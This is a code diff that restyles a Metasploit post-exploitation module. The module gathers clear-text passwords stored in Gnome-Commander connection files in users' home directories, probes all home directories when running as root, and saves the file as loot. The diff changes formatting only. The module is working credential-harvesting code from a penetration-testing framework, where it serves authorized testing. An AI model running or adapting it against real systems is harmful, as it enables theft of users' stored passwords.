@@ -6,26 +6,29 @@
 class MetasploitModule < Msf::Post
   include Msf::Post::File
 
-  def initialize(info={})
-    super( update_info( info,
-        'Name'          => 'Linux Gather Gnome-Commander Creds',
-        'Description'   => %q{
-            This module collects the clear text passwords stored by
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Linux Gather Gnome-Commander Creds',
+        'Description' => %q{
+          This module collects the clear text passwords stored by
           Gnome-commander, a GUI file explorer for GNOME.  Typically, these
           passwords are stored in the user's home directory, at
           ~/.gnome-commander/connections.
         },
-        'License'       => MSF_LICENSE,
-        'Author'        => [ 'David Bloom' ], # Twitter: @philophobia78
-        'Platform'      => %w{ linux },
-        'SessionTypes'  => [ 'meterpreter', 'shell']
-      ))
+        'License' => MSF_LICENSE,
+        'Author' => [ 'David Bloom' ], # Twitter: @philophobia78
+        'Platform' => %w[linux],
+        'SessionTypes' => [ 'meterpreter', 'shell']
+      )
+    )
   end
 
   def run
     user_dirs = []
     # Search current user
-    user = cmd_exec("whoami").chomp
+    user = cmd_exec('whoami').chomp
     # User is root
     if user == 'root'
       print_status("Current user is #{user}, probing all home dirs")
@@ -42,13 +45,13 @@ class MetasploitModule < Msf::Post
       # gnome-commander connections file
       connections_file = "#{dir}/.gnome-commander/connections"
       if file?(connections_file)
-        #File.exist
+        # File.exist
         begin
-          str_file=read_file(connections_file)
+          str_file = read_file(connections_file)
           print_good("File found: #{connections_file}")
           vprint_line(str_file)
-          #Store file
-          p = store_loot("connections", "text/plain", session, str_file, connections_file, "Gnome-Commander connections")
+          # Store file
+          p = store_loot('connections', 'text/plain', session, str_file, connections_file, 'Gnome-Commander connections')
           print_good("Connections file saved to #{p}")
         rescue EOFError
           # If there's nothing in the file, we hit EOFError
